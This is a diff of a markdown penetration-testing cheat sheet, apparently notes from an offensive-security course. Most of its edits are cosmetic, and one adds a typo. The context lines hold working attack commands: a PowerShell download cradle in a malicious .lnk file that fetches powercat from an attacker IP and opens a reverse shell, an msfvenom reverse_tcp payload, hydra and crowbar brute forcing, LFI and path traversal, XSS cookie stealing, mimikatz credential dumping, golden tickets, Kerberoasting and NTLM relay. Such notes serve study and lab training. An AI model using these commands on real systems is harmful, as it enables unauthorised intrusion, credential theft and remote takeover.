@@ -2,7 +2,7 @@
 
 ## Whois Enumeration
 
-* -h \<WHOIS server's IP address>
+* -h \<WHOIS server>
 
 ```bash
 whois megacorpone.com -h 192.168.50.251
@@ -14,7 +14,7 @@ whois 38.100.193.70 -h 192.168.50.251
 * **NS**: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
 * **A**: **host** record contains the IPv4 address of a hostname.
 * **AAAA**: quad A host record contains the IPv6 address of a hostname.
-* **MX**: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
+* **MX**: Mail Exchange records contain the names of the servers responsible for handling email for the domainv. A domain can contain multiple MX records.
 * **PTR**: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.
 * **CNAME**: Canonical Name Records are used to create aliases for other host records.
 * **TXT**: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.
@@ -24,14 +24,14 @@ host -t mx megacorpone.com
 ```
 
 ```bash
-for ip in $(cat list.txt); do host $ip.megacorpone.com; done
+for sub in $(cat list.txt); do host $sub.megacorpone.com; done
 ```
 
 ```bash
 for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
 ```
 
-Attempt the zone transfers
+Zone transfers
 
 ```bash
 host -l megacorpone.com ns1.megacorpone.com
@@ -41,8 +41,6 @@ host -l megacorpone.com ns1.megacorpone.com
 
 ```bash
 #!/bin/bash
-
-# Simple Zone Transfer Bash Script
 
 if [ -z "$1" ]; then
   echo "[*] Simple Zone transfer script"
@@ -54,7 +52,7 @@ fi
 
 for server in $(host -t ns $1 | cut -d " " -f4); do
   # For each of these servers, attempt a zone transfer
-  host -l $1 $server |grep "has address"
+  host -l $1 $server | grep "has address"
 done
 ```
 
@@ -70,7 +68,8 @@ nslookup -type=TXT info.megacorptwo.com 192.168.50.151
     * std: standard scan
     * brt: brute force
     * axfr: zone transfer
-* -D \<file name containing potential subdomain strings>
+
+* -D \<filename containing potential subdomain strings>
 
 Automate DNS enumeration
 
@@ -104,6 +103,7 @@ for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
 
 ```bash
 #!/bin/bash
+
 host=10.5.5.11
 for port in {1..65535}; do
     timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
@@ -195,10 +195,8 @@ net view \\dc01 /all
 List available shares
 
 ```bash
-smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
+smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Password1234
 ```
-
-Due to SMB signing being set to False => a relay attacks is possible if we can force an authentication request (impacket-ntlmrelayx)
 
 ```bash
 crackmapexec smb 192.168.50.242 -u john -d beyond.com -p "password" --shares
@@ -219,7 +217,7 @@ Both Portmapper and RPCbind run on TCP port 111. RPCbind maps RPC services to th
 
 The client system then contacts rpcbind on the server with a particular RPC **program number**. The rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service.
 
-Use NSE scripts to find services that may have registered with rpcbind
+Find services that may have registered with rpcbind
 
 ```bash
 nmap -v -p 111 10.11.1.1-254
@@ -231,7 +229,7 @@ nmap -p 111 --script nfs* 10.11.1.72
 sudo mount -o nolock 10.11.1.72:/home ~/home/
 ```
 
-Add a local user, change its UUID to e.g., 1014, su to that user, and then try accessing the file again
+Add a local user, change its UUID to e.g., 1014
 
 ```bash
 sudo adduser pwn
@@ -414,6 +412,7 @@ Cookie stealer
 **User-Agent** HTTP header: `<script>alert(42)</script>`
 
 **AJAX**
+
 ```js
 var ajaxRequest = new XMLHttpRequest();
 var requestURL = "/wp-admin/user-new.php";
@@ -482,6 +481,7 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/etc/passwd
 XAMPP's Apache logs: `C:\xampp\apache\logs\`
 
 ### LFI
+
 ```bash
 curl http://mountaindesserts.com/index.php?page=../../var/log/apache2/access.log
 ```
@@ -687,6 +687,7 @@ confluence=# select * from cwd_user;
 ```
 
 # Client-side Attacks
+
 - Malicious **JScript** code executed through the **Windows Script Host**
 
 - **.lnk** shortcut files pointing to malicious resources.
@@ -753,14 +754,15 @@ mkdir /home/kali/webdav
 /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 ```
 
-**location of the item** input field of the `automatic_configuration.lnk` shortcut file
+The **location of the item** input field of the `automatic_configuration.lnk` shortcut file
 
 ```bat
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
 ```
 
 `config.Library-ms`
-```
+
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
 <name>@windows.storage.dll,-34582</name>
@@ -785,6 +787,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 ## Email Pretexting and Sending
 
 `body.txt`
+
 ```
 Hey!
 
@@ -905,6 +908,7 @@ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
 ```
 
 ## On-disk evasion
+
 - Packers, obfuscators, crypter
 - Anti-reversing, anti-debugging, virtual machine emulation detection.
 - Software protectors like anti-copy
@@ -913,6 +917,7 @@ xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
 ## In-Memory evation**
 
 - **Remote Process Memory Injection** attempts to inject the payload into another valid PE that is not malicious.
+
  1. By leveraging a set of Windows API, first, use the **OpenProcess** function to obtain a valid **HANDLE** to a target process that we have permission to access.
 
  2. After obtaining the HANDLE, allocate memory in the context of that process by calling a Windows API such as **VirtualAllocEx**.
@@ -991,11 +996,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shik
 ## Attacking Network Services Logins
 
 ```bash
-gzip -d rockyou.txt.gz
+hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
 
 hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
-
-hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
 
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
 
@@ -1011,7 +1014,6 @@ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR
 Remote Desktop Protocol Attack with Crowbar
 
 ```bash
-sudo apt install crowbar
 crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
 ```
 
@@ -1046,11 +1048,7 @@ The mixed alpha set mixalpha, which includes all lower and upper case letters
 
 ```bash
 crunch 6 6 -t Lab%%% > wordlist
-
-crunch 8 8 -t ,@@^^%%%
-
 crunch 4 6 0123456789ABCDEF -o crunch.txt
-
 crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
 ```
 
@@ -1090,8 +1088,6 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 ```bash
 keepass2john Database.kdbx > keepass.hash
 
-hashcat --help | grep -i "KeePass"
-
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 ```
 
@@ -1116,6 +1112,7 @@ ssh2john id_rsa > ssh.hash
 #### Rule file for John the Ripper
 
 `ssh.rule`
+
 ```
 [List.Rules:sshRules]
 c $1 $3 $7 $!
@@ -1167,8 +1164,6 @@ lsadump::sam
 ```
 
 ```bash
-hashcat --help | grep -i "ntlm"
-
 hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
@@ -1250,6 +1245,8 @@ We also obtained Net-NTLMv2 hash the couldn't crack it because it was too comple
 
 If the user may be a **local administrator on another machine** => try to use the hash on another machine: **relay attack**.
 
+Due to SMB signing being set to False => a relay attacks is possible
+
 * --no-http-server: disable the HTTP server since we are relaying an SMB connection
 * -smb2support: add support for SMB2
 * -t: set the target to FILES02
@@ -1328,7 +1325,7 @@ From Windows Vista onward, processes run on 4 integrity levels:
 - Medium: Standard users
 - Low: very restricted rights often used in sandboxed processes or for directories storing temporary data
 
-Display the integrity level of processes with **Process Explorer** for our current user with `whoami /groups`, and for files with **icacls**.
+Display the integrity level of processes with **Process Explorer** for our current user with `whoami /groups`, and for files with `icacls`.
 
 Switch to a high integrity level 
 
@@ -1364,9 +1361,7 @@ Example **Built-in groups** include Administrators, **Backup Operators**, **Remo
 
 Members of:
 - **Backup Operators** can backup and restore all files on a computer, even those files they don't have permissions for.
-
 - **Remote Desktop Users** can access the system with RDP
-
 - **Remote Management Users** can access it with WinRM.
 
 ## Enumerating Windows
@@ -1382,6 +1377,7 @@ Key pieces of information to obtain:
 - Running processes
 
 **Automated Enumeration tools**:
+
 - winPEAS, https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
 - Seatbelt, https://github.com/GhostPack/Seatbelt
 - JAWS, https://github.com/411Hall/JAWS
@@ -1389,6 +1385,9 @@ Key pieces of information to obtain:
 
 ```bat
 whoami /groups
+```
+
+```bat
 net user
 net user steve
 net localgroup
@@ -1398,18 +1397,23 @@ net localgroup
 Get-LocalUser
 Get-LocalGroup
 Get-LocalGroupMember Administrators
+```
 
+```pwsh
 Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
 
+```pwsh
 Get-Process
 ```
 
 ```bat
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
 
+```bat
 ipconfig /all
-
 route print
 ```
 
@@ -1475,7 +1479,6 @@ Enumerating Binaries That AutoElevate (like SUID)
 
 ```bat
 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 
@@ -1489,7 +1492,6 @@ windows-privesc-check2.exe --dump -G
 ```
 
 Check Alex's mailbox: `C:\Users\alex\AppData\Roaming\Thunderbird\Profiles\jbv4ndsh.default-release\Mail\mail.sandbox.local\Inbox`
-
 
 ## Hidden in Plain View
 
@@ -1522,7 +1524,6 @@ Start a PowerShell Transcription with the path where the transcript file is stor
 
 ```pwsh
 Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
-
 Stop-Transcript
 ```
 
@@ -1586,6 +1587,7 @@ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 ```pwsh
 iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
+
 move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
 move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
 ```
@@ -1600,7 +1602,7 @@ Get a list of all privileges, The **Disabled** state only indicates if the privi
 whoami /priv
 ```
 
-In order to issue a reboot, user needs to have the privilege **SeShutDownPrivilege** assigned.
+To issue a reboot, user needs to have the privilege **SeShutDownPrivilege** assigned.
 
 ```bat
 shutdown /r /t 0
@@ -1614,7 +1616,6 @@ Displays services the current user can modify, such as the service binary or con
 . .\PowerUp.ps1
 
 Get-ModifiableServiceFile
-
 Install-ServiceBinary -Name 'mysql'
 ```
 
@@ -1750,7 +1751,6 @@ Stop-Service GammaService
 . .\PowerUp.ps1
 
 Get-UnquotedService
-
 Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
 ```
 
@@ -1810,24 +1810,26 @@ JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837
 ## Enumerating Linux
 
 ```bash
-ls -l /etc/shadow
-
 id
-
-cat /etc/passwd
-
 hostname
-
+uname -a
 cat /etc/issue
 cat /etc/os-release
 cat /proc/version
+```
 
-uname -a
+```bash
+ls -l /etc/shadow
+cat /etc/passwd
+```
 
+```bash
 ps -ef
 ps aux
 ps -fC leafpad
+```
 
+```bash
 ip a
 ifconfig
 ip addr
@@ -1843,7 +1845,6 @@ ip route
 
 ```bash
 netstat
-
 ss -anp
 ss -ntplu
 ss -antlp | grep sshd
@@ -1868,6 +1869,7 @@ List cron jobs running (System administrators often add their own scheduled task
 ```bash
 ls -lah /etc/cron*
 cat /etc/crontab
+
 crontab -l
 sudo crontab -l
 ```
@@ -1953,7 +1955,7 @@ sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
 
 ## Abusing Cron Jobs
 
-We could inspect the cron log file (`/var/log/cron.log`) for running cron jobs
+Inspect the cron log file (`/var/log/cron.log`) for running cron jobs
 
 ```bash
 grep "CRON" /var/log/syslog
@@ -2384,9 +2386,9 @@ sudo msfconsole -q
 ```
 
 ```
-db_status
-
 help
+
+db_status
 
 workspace
 workspace -a pen200
@@ -2683,21 +2685,24 @@ E.g., stephanie is a user object within the `corp.com` domain:
 
 - "DC": **Domain Component** represents the top of an LDAP tree or the Distinguished Name of the domain itself, `DC=corp,DC=com`.
 
+```pwsh
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+```
+
 ```bat
 net user /domain
 net user jeffadmin /domain
 net group /domain
 net group "Sales Department" /domain
+```
 
+```bat
 net group "Management Department" stephanie /add /domain
 net group "Management Department" stephanie /del /domain
 ```
 
-```pwsh
-[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-```
-
 `.\enumeration.ps1`
+
 ```pwsh
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $PDC = $domainObj.PdcRoleOwner.Name
@@ -2736,6 +2741,7 @@ Foreach($obj in $result)
 ```
 
 `function.ps1`
+
 ```pwsh
 function LDAPSearch {
     param (
@@ -2807,6 +2813,7 @@ Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurit
 ```
 
 A **capability SID** (e.g. S-1-15-3-1024-1065365936-...-4053264122-3456934681) is an unforgeable token of authority that grants a Windows component or a Universal Windows Application access to various resources.
+
 - In older Windows versions (before Windows Server 2019 build 1809), **Authenticated Users** were allowed to access the registry hive and obtain information from the SrvsvcSessionInfo key. However, following the least privilege principle, regular domain users should not be able to acquire this information within the domain.
 
 ```pwsh
@@ -2833,20 +2840,20 @@ When applications like Exchange, MS SQL, or IIS are integrated into AD, a unique
 
 Larger applications like MS SQL and Microsoft Exchange often required server redundancy when running to guarantee availability, but Managed Service Accounts did not support this. To remedy this, **Group Managed Service Accounts** were introduced with Windows Server 2012, but this requires that domain controllers run Windows Server 2012 or higher.
 
-Obtain a clear list of SPNs
+Obtain a list of SPNs
 
 ```pwsh
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
-If we previously discovered the iis_service user
+We previously discovered the iis_service user
 
 ```pwsh
 setspn -L iis_service
 ```
 
 ```pwsh
-nslookup.exe web04.corp.com
+nslookup web04.corp.com
 ```
 
 An object in AD may have a set of permissions applied to it with multiple **Access Control Entries (ACE)**. These ACEs make up the **Access Control List (ACL)**. Each ACE defines whether access to the specific object is allowed or denied.
@@ -2896,6 +2903,7 @@ Find the shares in the domain, add the `-CheckShareAccess` flag to display share
 
 ```pwsh
 Find-DomainShare
+Find-DomainShare -CheckShareAccess
 ```
 
 Older domain policy file contains an encrypted password for the local built-in Administrator account (cpassword)
@@ -3113,9 +3121,9 @@ Using **kinit** on a Linux system, we can obtain and cache a Kerberos TGT. If a 
 
 ### AS-REP Roasting
 
-The first step of the authentication process via Kerberos (commonly referred to as **Kerberos preauthentication**) is to send an AS-REQ. If the authentication is successful, the domain controller replies with an AS-REP containing the session key and TGT.
+The 1st step of the authentication process via Kerberos (commonly referred to as **Kerberos preauthentication**) is to send an AS-REQ. If the authentication is successful, the domain controller replies with an AS-REP containing the session key and TGT.
 
-Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.
+Without **Kerberos preauthentication** in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.
 
 By default, the AD user account option **Do not require Kerberos preauthentication** is disabled => Kerberos preauthentication is performed for all users.
 
@@ -3132,8 +3140,6 @@ Perform AS-REP Roasting on Windows with Rubeus
 ```
 
 ```bash
-hashcat --help | grep -i "Kerberos"
-
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
@@ -3143,9 +3149,9 @@ To identify users with the enabled AD user account option **Do not require Kerbe
 Get-DomainUser -PreauthNotRequired
 ```
 
-If we have **GenericWrite or GenericAll** permissions on another AD user account, we could reset their passwords, but this would lock out the user from accessing the account.
+If we have **GenericWrite** or **GenericAll** permissions on another AD user account, we could reset their passwords, but this would lock out the user from accessing the account.
 
-=> To modify the User Account Control value of the user to not require Kerberos preauthentication, aka **Targeted AS-REP Roasting**. Notably, we should reset the User Account Control value of the user once we've obtained the hash.
+=> Modify the **User Account Control** value of the user to not require Kerberos preauthentication, aka **Targeted AS-REP Roasting**. Then reset the User Account Control value of the user once we've obtained the hash.
 
 ### Kerberoasting
 
@@ -3157,11 +3163,11 @@ When requesting the service ticket from the domain controller, no checks are per
 
 The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing -> crack the cleartext password of the service account.
 
-=> If the domain contains high-privilege service accounts with weak passwords
+=> If the domain contains high-privilege service accounts with **weak passwords**
 
 However, if the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the krbtgt user account which acts as service account for the KDC.
 
-If we have GenericWrite or GenericAll permissions on another AD user account, we could reset the user's password but this may raise suspicion.
+If we have **GenericWrite** or **GenericAll** permissions on another AD user account, we could reset the user's password but this may raise suspicion.
 
 => Set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.
 
@@ -3183,6 +3189,7 @@ Request the service ticket (the registered SPN for the IIS web server in the dom
 
 ```pwsh
 Add-Type -AssemblyName System.IdentityModel
+
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
 ```
 
@@ -3253,7 +3260,7 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
 exit
 ```
 
-From the perspective of the IIS application, the current user will be both the built-in local administrator (Relative Id: 500) and a member of several highly-privileged groups, including the Domain Admins group (Relative Id: 512)
+From the perspective of the IIS application, the current user will be both the built-in local administrator (Relative Id: 500) and a member of several highly-privileged groups, including the **Domain Admins** group (Relative Id: 512)
 
 ```pwsh
 klist
